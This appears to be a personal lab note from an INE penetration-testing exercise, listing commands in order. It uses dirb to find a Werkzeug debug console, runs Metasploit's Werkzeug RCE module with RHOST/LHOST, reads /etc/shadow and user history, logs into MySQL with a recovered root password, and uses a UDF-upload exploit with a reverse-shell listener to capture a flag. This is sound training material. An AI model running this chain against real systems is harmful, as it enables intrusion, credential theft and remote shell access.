---
title: Part 1
updated: 2022-02-13 09:57:35Z
created: 2022-02-13 08:35:07Z
latitude: 45.12540000
longitude: 25.73340000
altitude: 0.0000
---

![0cc20de6e306e04c52396fd24c0f25a0.png](../_resources/0cc20de6e306e04c52396fd24c0f25a0.png)

dirb http://server1.ine.local

+ http://server1.ine.local:80/console (CODE:200|SIZE:1479)              
+ msfconsole -q
+ search werkzeug
+ use exploit/multi/http/werkzeug_debug_rce
- set RHOST 192.254.181.3
- set LHOST 192.254.181.2
- exploit
- getuid
- cat /etc/shadow
- background
- use post/linux/gather/enum_users_history
- set SESSION 1
- run           
![98509526966724f274b0e0c504fbdd8e.png](../_resources/98509526966724f274b0e0c504fbdd8e.png)

cat /root/.msf4/loot/20220213145601_default_192.254.181.3_linux.enum.users_047626.txt

cat /root/.msf4/loot/20220213145601_default_192.254.181.3_linux.enum.users_010553.txt

![6bcbdd0d45072bccf9cbd9696ac86550.png](../_resources/6bcbdd0d45072bccf9cbd9696ac86550.png)

mysql -h server2.ine.local -u root -pfArFLP29UySm4bZj
show databases;

![13327e8d48509cc0680f178c64982394.png](../_resources/13327e8d48509cc0680f178c64982394.png)

- exit
![28cab41375d3b1ac212dd868839b8b16.png](../_resources/28cab41375d3b1ac212dd868839b8b16.png)

- show options
- start a terminal listening on 4444
- set FORCE_UDF_UPLOAD true
set PASSWORD fArFLP29UySm4bZj
set RHOSTS server2.ine.local
set TARGET 1
set LHOST 192.254.181.2
exploit
# after session started and hanged in - ctrl+c
session -i 2
- cat /root/flag
![49ff003e0c7a300cf1f1055ec2bc05d1.png](../_resources/49ff003e0c7a300cf1f1055ec2bc05d1.png)

